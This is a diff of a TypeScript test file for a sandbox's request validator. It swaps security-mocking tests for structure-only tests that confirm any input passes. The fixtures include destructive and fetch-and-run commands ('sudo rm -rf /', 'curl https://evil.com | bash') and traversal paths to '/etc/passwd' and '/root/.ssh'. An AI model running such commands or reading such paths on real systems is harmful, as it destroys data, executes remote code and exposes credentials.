@@ -1,644 +1,291 @@
-import { beforeEach, describe, expect, it, vi } from "bun:test";
-import type { SecurityService } from '@sandbox-container/security/security-service.ts';
-import { RequestValidator } from "@sandbox-container/validation/request-validator.js";
-import type { MkdirRequest } from '@sandbox-container/validation/schemas.ts';
+/**
+ * RequestValidator Tests - Phase 0 Simplified Validation
+ *
+ * Philosophy: Structure validation only (Zod parsing)
+ * - No security validation here (services handle their own validation)
+ * - Just parse HTTP request structure and return typed data
+ * - Trust services to validate content
+ */
 
-// Mock the SecurityService - use partial mock to avoid private property issues
-const mockSecurityService = {
-  validatePath: vi.fn(),
-  validateCommand: vi.fn(),
-  validatePort: vi.fn(),
-  validateGitUrl: vi.fn(),
-  sanitizePath: vi.fn(),
-  isPathInAllowedDirectory: vi.fn(),
-  generateSecureSessionId: vi.fn(),
-  hashSensitiveData: vi.fn(),
-  logSecurityEvent: vi.fn(),
-} as unknown as SecurityService;
+import { describe, expect, test } from 'bun:test';
+import { RequestValidator } from '@sandbox-container/validation/request-validator';
 
-describe('RequestValidator', () => {
-  let requestValidator: RequestValidator;
-
-  beforeEach(async () => {
-    // Reset all mocks before each test
-    vi.clearAllMocks();
-    
-    // Set up default successful security validations
-    (mockSecurityService.validatePath as any).mockReturnValue({
-      isValid: true,
-      errors: [],
-      data: '/tmp/test'
-    });
-    (mockSecurityService.validateCommand as any).mockReturnValue({
-      isValid: true,
-      errors: [],
-      data: 'ls -la'
-    });
-    (mockSecurityService.validatePort as any).mockReturnValue({
-      isValid: true,
-      errors: [],
-      data: 8080
-    });
-    (mockSecurityService.validateGitUrl as any).mockReturnValue({
-      isValid: true,
-      errors: [],
-      data: 'https://github.com/user/repo.git'
-    });
-
-    requestValidator = new RequestValidator(mockSecurityService);
-  });
+describe('RequestValidator - Structure Validation Only', () => {
+  const validator = new RequestValidator();
 
   describe('validateExecuteRequest', () => {
-    describe('valid requests', () => {
-      it('should validate minimal execute request', async () => {
-        const validRequest = {
-          command: 'ls -la'
-        };
-
-        const result = requestValidator.validateExecuteRequest(validRequest);
-
-        expect(result.isValid).toBe(true);
-        expect(result.data).toEqual({
-          command: 'ls -la'
-        });
-        expect(result.errors).toHaveLength(0);
-
-        // Verify security validation was called
-        expect(mockSecurityService.validateCommand).toHaveBeenCalledWith('ls -la');
+    test('should validate valid execute request', () => {
+      const result = validator.validateExecuteRequest({
+        command: 'echo hello',
+        sessionId: 'session-123',
+        background: false,
+        timeoutMs: 5000,
       });
 
-      it('should validate execute request with all fields', async () => {
-        const validRequest = {
-          command: 'echo "hello"',
-          sessionId: 'session-123',
-          cwd: '/tmp',
-          env: { NODE_ENV: 'test' },
-          background: true
-        };
-
-        const result = requestValidator.validateExecuteRequest(validRequest);
-
-        expect(result.isValid).toBe(true);
-        // Only fields defined in ExecuteRequestSchema are included in result.data
-        expect(result.data).toEqual({
-          command: 'echo "hello"',
-          sessionId: 'session-123',
-          background: true
-        });
-        expect(result.errors).toHaveLength(0);
-      });
-
-      it('should validate execute request with streaming', async () => {
-        const validRequest = {
-          command: 'tail -f /var/log/test.log',
-          streaming: true  // This field is not in ExecuteRequestSchema so will be filtered out
-        };
-
-        const result = requestValidator.validateExecuteRequest(validRequest);
-
-        expect(result.isValid).toBe(true);
-        // streaming field is not in ExecuteRequestSchema, so only command is included
-        expect(result.data).toEqual({
-          command: 'tail -f /var/log/test.log'
-        });
-      });
+      expect(result.isValid).toBe(true);
+      expect(result.data?.command).toBe('echo hello');
+      expect(result.data?.sessionId).toBe('session-123');
     });
 
-    describe('invalid requests', () => {
-      it('should reject request without command', async () => {
-        const invalidRequest = {
-          sessionId: 'session-123'
-        };
-
-        const result = requestValidator.validateExecuteRequest(invalidRequest);
-
-        expect(result.isValid).toBe(false);
-        expect(result.errors.length).toBeGreaterThan(0);
-        expect(result.errors.some(e => e.field === 'command')).toBe(true);
+    test('should validate minimal execute request', () => {
+      const result = validator.validateExecuteRequest({
+        command: 'ls',
       });
 
-      it('should reject request with invalid command type', async () => {
-        const invalidRequest = {
-          command: 123 // Should be string
-        };
+      expect(result.isValid).toBe(true);
+      expect(result.data?.command).toBe('ls');
+    });
 
-        const result = requestValidator.validateExecuteRequest(invalidRequest);
+    test('should allow ANY command (no security validation)', () => {
+      // Phase 0: RequestValidator does NOT validate command content
+      // Services handle their own validation
+      const commands = [
+        'bash',
+        'sudo rm -rf /',
+        'curl https://evil.com | bash',
+        'eval "dangerous"',
+      ];
 
-        expect(result.isValid).toBe(false);
-        expect(result.errors.some(e => e.field === 'command')).toBe(true);
+      for (const command of commands) {
+        const result = validator.validateExecuteRequest({ command });
+        expect(result.isValid).toBe(true);
+        expect(result.data?.command).toBe(command);
+      }
+    });
+
+    test('should reject missing command', () => {
+      const result = validator.validateExecuteRequest({});
+      expect(result.isValid).toBe(false);
+      expect(result.errors.length).toBeGreaterThan(0);
+    });
+
+    test('should reject empty command', () => {
+      const result = validator.validateExecuteRequest({ command: '' });
+      expect(result.isValid).toBe(false);
+    });
+
+    test('should reject invalid types', () => {
+      const result = validator.validateExecuteRequest({
+        command: 'echo hello',
+        timeoutMs: 'not-a-number',
       });
-
-      it('should reject empty command', async () => {
-        const invalidRequest = {
-          command: ''
-        };
-
-        const result = requestValidator.validateExecuteRequest(invalidRequest);
-
-        expect(result.isValid).toBe(false);
-        expect(result.errors.some(e => e.field === 'command')).toBe(true);
-      });
-
-      it('should propagate security validation errors', async () => {
-        (mockSecurityService.validateCommand as any).mockReturnValue({
-          isValid: false,
-          errors: [{
-            field: 'command',
-            message: 'Command contains dangerous pattern',
-            code: 'COMMAND_SECURITY_VIOLATION'
-          }]
-        });
-
-        const validRequest = {
-          command: 'rm -rf /'
-        };
-
-        const result = requestValidator.validateExecuteRequest(validRequest);
-
-        expect(result.isValid).toBe(false);
-        expect(result.errors[0].code).toBe('COMMAND_SECURITY_VIOLATION');
-        expect(result.errors[0].message).toContain('dangerous pattern');
-      });
-
-      it('should reject invalid background type', async () => {
-        const invalidRequest = {
-          command: 'ls',
-          background: 'true' // Should be boolean
-        };
-
-        const result = requestValidator.validateExecuteRequest(invalidRequest);
-
-        expect(result.isValid).toBe(false);
-        expect(result.errors.some(e => e.field === 'background')).toBe(true);
-      });
-
-      it('should ignore fields not in schema (like env)', async () => {
-        const requestWithExtraFields = {
-          command: 'ls',
-          env: 'invalid', // This field is not in ExecuteRequestSchema so will be ignored
-          extraField: 'also ignored'
-        };
-
-        const result = requestValidator.validateExecuteRequest(requestWithExtraFields);
-
-        expect(result.isValid).toBe(true); // Validation passes because extra fields are ignored
-        expect(result.data).toEqual({
-          command: 'ls'
-        });
-      });
+      expect(result.isValid).toBe(false);
     });
   });
 
   describe('validateFileRequest', () => {
-    describe('read operations', () => {
-      it('should validate read file request', async () => {
-        const validRequest = {
-          path: '/tmp/test.txt',
-          encoding: 'utf-8'
-        };
+    test('should validate read file request', () => {
+      const result = validator.validateFileRequest(
+        { path: '/workspace/file.txt', sessionId: 'session-123' },
+        'read'
+      );
 
-        const result = requestValidator.validateFileRequest(validRequest, 'read');
-
-        expect(result.isValid).toBe(true);
-        expect(result.data).toEqual(validRequest);
-        expect(mockSecurityService.validatePath).toHaveBeenCalledWith('/tmp/test.txt');
-      });
-
-      it('should reject read request without path', async () => {
-        const invalidRequest = {
-          encoding: 'utf-8'
-        };
-
-        const result = requestValidator.validateFileRequest(invalidRequest, 'read');
-
-        expect(result.isValid).toBe(false);
-        expect(result.errors.some(e => e.field === 'path')).toBe(true);
-      });
+      expect(result.isValid).toBe(true);
+      expect(result.data?.path).toBe('/workspace/file.txt');
     });
 
-    describe('write operations', () => {
-      it('should validate write file request', async () => {
-        const validRequest = {
-          path: '/tmp/output.txt',
-          content: 'Hello, World!',
-          encoding: 'utf-8'
-        };
+    test('should validate write file request', () => {
+      const result = validator.validateFileRequest(
+        { path: '/workspace/file.txt', content: 'hello world' },
+        'write'
+      );
 
-        const result = requestValidator.validateFileRequest(validRequest, 'write');
-
-        expect(result.isValid).toBe(true);
-        expect(result.data).toEqual(validRequest);
-        expect(mockSecurityService.validatePath).toHaveBeenCalledWith('/tmp/output.txt');
-      });
-
-      it('should reject write request without content', async () => {
-        const invalidRequest = {
-          path: '/tmp/output.txt'
-        };
-
-        const result = requestValidator.validateFileRequest(invalidRequest, 'write');
-
-        expect(result.isValid).toBe(false);
-        expect(result.errors.some(e => e.field === 'content')).toBe(true);
-      });
+      expect(result.isValid).toBe(true);
+      expect(result.data?.path).toBe('/workspace/file.txt');
     });
 
-    describe('delete operations', () => {
-      it('should validate delete file request', async () => {
-        const validRequest = {
-          path: '/tmp/delete-me.txt'
-        };
+    test('should allow ANY path (no security validation)', () => {
+      // Phase 0: RequestValidator does NOT validate path content
+      // Services handle their own validation
+      const paths = [
+        '/etc/passwd',
+        '/../../../etc/passwd',
+        '/tmp/../../root/.ssh',
+        '/var/log/sensitive',
+      ];
 
-        const result = requestValidator.validateFileRequest(validRequest, 'delete');
-
+      for (const path of paths) {
+        const result = validator.validateFileRequest({ path }, 'read');
         expect(result.isValid).toBe(true);
-        expect(result.data).toEqual(validRequest);
-        expect(mockSecurityService.validatePath).toHaveBeenCalledWith('/tmp/delete-me.txt');
-      });
+        expect(result.data?.path).toBe(path);
+      }
     });
 
-    describe('rename operations', () => {
-      it('should validate rename file request', async () => {
-        const validRequest = {
-          oldPath: '/tmp/old-name.txt',
-          newPath: '/tmp/new-name.txt'
-        };
-
-        const result = requestValidator.validateFileRequest(validRequest, 'rename');
-
-        expect(result.isValid).toBe(true);
-        expect(result.data).toEqual(validRequest);
-
-        // Should validate both paths
-        expect(mockSecurityService.validatePath).toHaveBeenCalledWith('/tmp/old-name.txt');
-        expect(mockSecurityService.validatePath).toHaveBeenCalledWith('/tmp/new-name.txt');
-      });
-
-      it('should reject rename request with invalid paths', async () => {
-        (mockSecurityService.validatePath as any)
-          .mockReturnValueOnce({ isValid: true, errors: [] })    // oldPath valid
-          .mockReturnValueOnce({                                 // newPath invalid
-            isValid: false,
-            errors: [{
-              field: 'path',
-              message: 'Path contains dangerous pattern',
-              code: 'PATH_SECURITY_VIOLATION'
-            }]
-          });
-
-        const validRequest = {
-          oldPath: '/tmp/old-name.txt',
-          newPath: '/etc/passwd'
-        };
-
-        const result = requestValidator.validateFileRequest(validRequest, 'rename');
-
-        expect(result.isValid).toBe(false);
-        expect(result.errors[0].code).toBe('PATH_SECURITY_VIOLATION');
-      });
+    test('should reject missing path', () => {
+      const result = validator.validateFileRequest({}, 'read');
+      expect(result.isValid).toBe(false);
     });
 
-    describe('move operations', () => {
-      it('should validate move file request', async () => {
-        const validRequest = {
-          sourcePath: '/tmp/source.txt',
-          destinationPath: '/tmp/destination.txt'
-        };
-
-        const result = requestValidator.validateFileRequest(validRequest, 'move');
-
-        expect(result.isValid).toBe(true);
-        expect(result.data).toEqual(validRequest);
-
-        // Should validate both paths
-        expect(mockSecurityService.validatePath).toHaveBeenCalledWith('/tmp/source.txt');
-        expect(mockSecurityService.validatePath).toHaveBeenCalledWith('/tmp/destination.txt');
-      });
+    test('should reject empty path', () => {
+      const result = validator.validateFileRequest({ path: '' }, 'read');
+      expect(result.isValid).toBe(false);
     });
 
-    describe('mkdir operations', () => {
-      it('should validate mkdir request', async () => {
-        const validRequest = {
-          path: '/tmp/new-directory',
-          recursive: true
-        };
-
-        const result = requestValidator.validateFileRequest(validRequest, 'mkdir');
-
-        expect(result.isValid).toBe(true);
-        expect(result.data).toEqual(validRequest);
-        expect(mockSecurityService.validatePath).toHaveBeenCalledWith('/tmp/new-directory');
-      });
-
-      it('should validate mkdir request without recursive flag', async () => {
-        const validRequest = {
-          path: '/tmp/simple-dir'
-        };
-
-        const result = requestValidator.validateFileRequest(validRequest, 'mkdir');
-
-        expect(result.isValid).toBe(true);
-        expect((result.data as MkdirRequest)?.recursive).toBeUndefined();
-      });
+    test('should validate delete request', () => {
+      const result = validator.validateFileRequest(
+        { path: '/workspace/delete-me.txt' },
+        'delete'
+      );
+      expect(result.isValid).toBe(true);
     });
 
-    describe('path security validation', () => {
-      it('should propagate path security validation errors', async () => {
-        (mockSecurityService.validatePath as any).mockReturnValue({
-          isValid: false,
-          errors: [{
-            field: 'path',
-            message: 'Path contains directory traversal',
-            code: 'PATH_SECURITY_VIOLATION'
-          }]
-        });
+    test('should validate rename request', () => {
+      const result = validator.validateFileRequest(
+        { oldPath: '/workspace/old.txt', newPath: '/workspace/new.txt' },
+        'rename'
+      );
+      expect(result.isValid).toBe(true);
+    });
 
-        const invalidRequest = {
-          path: '/tmp/../etc/passwd'
-        };
+    test('should validate move request', () => {
+      const result = validator.validateFileRequest(
+        { sourcePath: '/workspace/source.txt', destinationPath: '/tmp/dest.txt' },
+        'move'
+      );
+      expect(result.isValid).toBe(true);
+    });
 
-        const result = requestValidator.validateFileRequest(invalidRequest, 'read');
-
-        expect(result.isValid).toBe(false);
-        expect(result.errors[0].code).toBe('PATH_SECURITY_VIOLATION');
-        expect(result.errors[0].message).toContain('directory traversal');
-      });
+    test('should validate mkdir request', () => {
+      const result = validator.validateFileRequest(
+        { path: '/workspace/newdir', recursive: true },
+        'mkdir'
+      );
+      expect(result.isValid).toBe(true);
     });
   });
 
   describe('validateProcessRequest', () => {
-    describe('valid requests', () => {
-      it('should validate process start request', async () => {
-        const validRequest = {
-          command: 'sleep 60',
-          background: true,  // Not in StartProcessRequestSchema, will be filtered out
-          cwd: '/tmp',       // Not in StartProcessRequestSchema, will be filtered out  
-          env: { NODE_ENV: 'production' }  // Not in StartProcessRequestSchema, will be filtered out
-        };
-
-        const result = requestValidator.validateProcessRequest(validRequest);
-
-        expect(result.isValid).toBe(true);
-        // Only fields defined in StartProcessRequestSchema are included
-        expect(result.data).toEqual({
-          command: 'sleep 60'
-        });
-        expect(mockSecurityService.validateCommand).toHaveBeenCalledWith('sleep 60');
+    test('should validate process start request', () => {
+      const result = validator.validateProcessRequest({
+        command: 'npm start',
+        options: {
+          sessionId: 'session-123',
+          env: { NODE_ENV: 'production' },
+          cwd: '/workspace',
+        },
       });
 
-      it('should validate minimal process request', async () => {
-        const validRequest = {
-          command: 'node app.js'
-        };
-
-        const result = requestValidator.validateProcessRequest(validRequest);
-
-        expect(result.isValid).toBe(true);
-        expect(result.data).toEqual(validRequest);
-      });
+      expect(result.isValid).toBe(true);
+      expect(result.data?.command).toBe('npm start');
     });
 
-    describe('invalid requests', () => {
-      it('should reject process request without command', async () => {
-        const invalidRequest = {
-          background: true
-        };
-
-        const result = requestValidator.validateProcessRequest(invalidRequest);
-
-        expect(result.isValid).toBe(false);
-        expect(result.errors.some(e => e.field === 'command')).toBe(true);
+    test('should validate minimal process request', () => {
+      const result = validator.validateProcessRequest({
+        command: 'sleep 10',
       });
 
-      it('should propagate command security validation errors', async () => {
-        (mockSecurityService.validateCommand as any).mockReturnValue({
-          isValid: false,
-          errors: [{
-            field: 'command',
-            message: 'Command contains privilege escalation attempt',
-            code: 'COMMAND_SECURITY_VIOLATION'
-          }]
-        });
+      expect(result.isValid).toBe(true);
+      expect(result.data?.command).toBe('sleep 10');
+    });
 
-        const invalidRequest = {
-          command: 'sudo rm -rf /'
-        };
-
-        const result = requestValidator.validateProcessRequest(invalidRequest);
-
-        expect(result.isValid).toBe(false);
-        expect(result.errors[0].code).toBe('COMMAND_SECURITY_VIOLATION');
+    test('should allow ANY command (no security validation)', () => {
+      // Phase 0: No command validation in RequestValidator
+      const result = validator.validateProcessRequest({
+        command: 'sudo rm -rf /',
       });
+      expect(result.isValid).toBe(true);
+    });
+
+    test('should reject missing command', () => {
+      const result = validator.validateProcessRequest({});
+      expect(result.isValid).toBe(false);
     });
   });
 
   describe('validatePortRequest', () => {
-    describe('valid requests', () => {
-      it('should validate port expose request with name', async () => {
-        const validRequest = {
-          port: 8080,
-          name: 'web-server'
-        };
-
-        const result = requestValidator.validatePortRequest(validRequest);
-
-        expect(result.isValid).toBe(true);
-        expect(result.data).toEqual(validRequest);
-        expect(mockSecurityService.validatePort).toHaveBeenCalledWith(8080);
+    test('should validate port expose request', () => {
+      const result = validator.validatePortRequest({
+        port: 8080,
+        name: 'web-server',
       });
 
-      it('should validate port expose request without name', async () => {
-        const validRequest = {
-          port: 9000
-        };
-
-        const result = requestValidator.validatePortRequest(validRequest);
-
-        expect(result.isValid).toBe(true);
-        expect(result.data).toEqual(validRequest);
-      });
+      expect(result.isValid).toBe(true);
+      expect(result.data?.port).toBe(8080);
+      expect(result.data?.name).toBe('web-server');
     });
 
-    describe('invalid requests', () => {
-      it('should reject port request without port number', async () => {
-        const invalidRequest = {
-          name: 'web-server'
-        };
+    test('should allow ANY port number (no security validation)', () => {
+      // Phase 0: No port validation in RequestValidator
+      // Services will validate (only port 3000 is blocked)
+      const ports = [22, 80, 443, 3000, 8080, 65535];
 
-        const result = requestValidator.validatePortRequest(invalidRequest);
+      for (const port of ports) {
+        const result = validator.validatePortRequest({ port });
+        expect(result.isValid).toBe(true);
+        expect(result.data?.port).toBe(port);
+      }
+    });
 
-        expect(result.isValid).toBe(false);
-        expect(result.errors.some(e => e.field === 'port')).toBe(true);
-      });
+    test('should reject invalid port range (Zod schema check)', () => {
+      // Phase 0: Schema allows 1-65535 (services will validate - only port 3000 is blocked)
+      const resultTooLow = validator.validatePortRequest({ port: 0 });
+      expect(resultTooLow.isValid).toBe(false);
 
-      it('should reject port request with invalid port type', async () => {
-        const invalidRequest = {
-          port: '8080' // Should be number
-        };
+      const resultTooHigh = validator.validatePortRequest({ port: 65536 });
+      expect(resultTooHigh.isValid).toBe(false);
 
-        const result = requestValidator.validatePortRequest(invalidRequest);
+      const resultValid = validator.validatePortRequest({ port: 500 });
+      expect(resultValid.isValid).toBe(true); // Now allowed (1-65535)
+    });
 
-        expect(result.isValid).toBe(false);
-        expect(result.errors.some(e => e.field === 'port')).toBe(true);
-      });
+    test('should reject missing port', () => {
+      const result = validator.validatePortRequest({});
+      expect(result.isValid).toBe(false);
+    });
 
-      it('should propagate port security validation errors', async () => {
-        (mockSecurityService.validatePort as any).mockReturnValue({
-          isValid: false,
-          errors: [{
-            field: 'port',
-            message: 'Port 3000 is reserved for the container control plane',
-            code: 'INVALID_PORT'
-          }]
-        });
-
-        const invalidRequest = {
-          port: 3000  // Port 3000 passes Zod validation (>= 1024) but fails security validation
-        };
-
-        const result = requestValidator.validatePortRequest(invalidRequest);
-
-        expect(result.isValid).toBe(false);
-        expect(result.errors[0].code).toBe('INVALID_PORT');
-        expect(result.errors[0].message).toContain('reserved');
-      });
+    test('should reject invalid port type', () => {
+      const result = validator.validatePortRequest({ port: 'not-a-number' });
+      expect(result.isValid).toBe(false);
     });
   });
 
   describe('validateGitRequest', () => {
-    describe('valid requests', () => {
-      it('should validate git checkout request with all fields', async () => {
-        const validRequest = {
-          repoUrl: 'https://github.com/user/awesome-repo.git',
-          branch: 'develop',
-          targetDir: '/tmp/project',
-          sessionId: 'session-456'
-        };
-
-        const result = requestValidator.validateGitRequest(validRequest);
-
-        expect(result.isValid).toBe(true);
-        expect(result.data).toEqual(validRequest);
-        expect(mockSecurityService.validateGitUrl).toHaveBeenCalledWith(validRequest.repoUrl);
-        expect(mockSecurityService.validatePath).toHaveBeenCalledWith(validRequest.targetDir);
+    test('should validate git checkout request', () => {
+      const result = validator.validateGitRequest({
+        repoUrl: 'https://github.com/user/repo.git',
+        branch: 'main',
+        targetDir: '/workspace/repo',
       });
 
-      it('should validate minimal git checkout request', async () => {
-        const validRequest = {
-          repoUrl: 'https://github.com/user/simple-repo.git'
-        };
-
-        const result = requestValidator.validateGitRequest(validRequest);
-
-        expect(result.isValid).toBe(true);
-        expect(result.data).toEqual(validRequest);
-        expect(mockSecurityService.validateGitUrl).toHaveBeenCalledWith(validRequest.repoUrl);
-        // Should not call validatePath since targetDir is not provided
-        expect(mockSecurityService.validatePath).not.toHaveBeenCalled();
-      });
-
-      it('should validate git request without targetDir', async () => {
-        const validRequest = {
-          repoUrl: 'https://github.com/user/repo.git',
-          branch: 'main'
-        };
-
-        const result = requestValidator.validateGitRequest(validRequest);
-
-        expect(result.isValid).toBe(true);
-        expect(result.data?.targetDir).toBeUndefined();
-      });
+      expect(result.isValid).toBe(true);
+      expect(result.data?.repoUrl).toBe('https://github.com/user/repo.git');
     });
 
-    describe('invalid requests', () => {
-      it('should reject git request without repoUrl', async () => {
-        const invalidRequest = {
-          branch: 'main'
-        };
-
-        const result = requestValidator.validateGitRequest(invalidRequest);
-
-        expect(result.isValid).toBe(false);
-        expect(result.errors.some(e => e.field === 'repoUrl')).toBe(true);
+    test('should validate minimal git request', () => {
+      const result = validator.validateGitRequest({
+        repoUrl: 'https://github.com/user/repo.git',
       });
 
-      it('should reject git request with invalid repoUrl type', async () => {
-        const invalidRequest = {
-          repoUrl: 123 // Should be string
-        };
-
-        const result = requestValidator.validateGitRequest(invalidRequest);
-
-        expect(result.isValid).toBe(false);
-        expect(result.errors.some(e => e.field === 'repoUrl')).toBe(true);
-      });
-
-      it('should propagate Git URL security validation errors', async () => {
-        (mockSecurityService.validateGitUrl as any).mockReturnValue({
-          isValid: false,
-          errors: [{
-            field: 'gitUrl',
-            message: 'Git URL must be from a trusted provider',
-            code: 'GIT_URL_SECURITY_VIOLATION'
-          }]
-        });
-
-        const invalidRequest = {
-          repoUrl: 'https://malicious.com/repo.git'
-        };
-
-        const result = requestValidator.validateGitRequest(invalidRequest);
-
-        expect(result.isValid).toBe(false);
-        expect(result.errors[0].code).toBe('GIT_URL_SECURITY_VIOLATION');
-        expect(result.errors[0].message).toContain('trusted provider');
-      });
-
-      it('should propagate target directory validation errors', async () => {
-        (mockSecurityService.validatePath as any).mockReturnValue({
-          isValid: false,
-          errors: [{
-            field: 'path',
-            message: 'Path outside sandbox',
-            code: 'PATH_SECURITY_VIOLATION'
-          }]
-        });
-
-        const invalidRequest = {
-          repoUrl: 'https://github.com/user/repo.git',
-          targetDir: '/etc/malicious'
-        };
-
-        const result = requestValidator.validateGitRequest(invalidRequest);
-
-        expect(result.isValid).toBe(false);
-        expect(result.errors[0].code).toBe('PATH_SECURITY_VIOLATION');
-        expect(result.errors[0].message).toContain('outside sandbox');
-      });
+      expect(result.isValid).toBe(true);
     });
-  });
 
-  describe('error handling', () => {
-    it('should handle invalid inputs and convert Zod errors', async () => {
-      // Null/undefined
-      expect(requestValidator.validateExecuteRequest(null).isValid).toBe(false);
-      expect(requestValidator.validateExecuteRequest(undefined).isValid).toBe(false);
+    test('should allow ANY Git URL (no security validation)', () => {
+      // Phase 0: No URL allowlist in RequestValidator
+      // Services will validate (format only, no allowlist)
+      const urls = [
+        'https://github.com/user/repo.git',
+        'https://git.company.com/repo.git',
+        'git@github.com:user/repo.git',
+        'https://my-server.io/repo.git',
+      ];
 
-      // Non-objects
-      expect(requestValidator.validateExecuteRequest('invalid').isValid).toBe(false);
-      expect(requestValidator.validateExecuteRequest(123).isValid).toBe(false);
-
-      // Invalid types - verify error structure
-      const invalidRequest = { command: 123, background: 'not-boolean' };
-      const result = requestValidator.validateExecuteRequest(invalidRequest);
-
-      expect(result.isValid).toBe(false);
-      expect(result.errors.length).toBeGreaterThan(0);
-      for (const error of result.errors) {
-        expect(error).toHaveProperty('field');
-        expect(error).toHaveProperty('message');
-        expect(error).toHaveProperty('code');
+      for (const url of urls) {
+        const result = validator.validateGitRequest({ repoUrl: url });
+        expect(result.isValid).toBe(true);
+        expect(result.data?.repoUrl).toBe(url);
       }
+    });
+
+    test('should reject missing repoUrl', () => {
+      const result = validator.validateGitRequest({});
+      expect(result.isValid).toBe(false);
+    });
+
+    test('should allow any non-empty string as URL (Phase 0)', () => {
+      // Phase 0: No URL format validation in schema
+      // Services handle format validation (null bytes, length limits only)
+      const result = validator.validateGitRequest({ repoUrl: 'any-string-here' });
+      expect(result.isValid).toBe(true);
     });
   });
 });
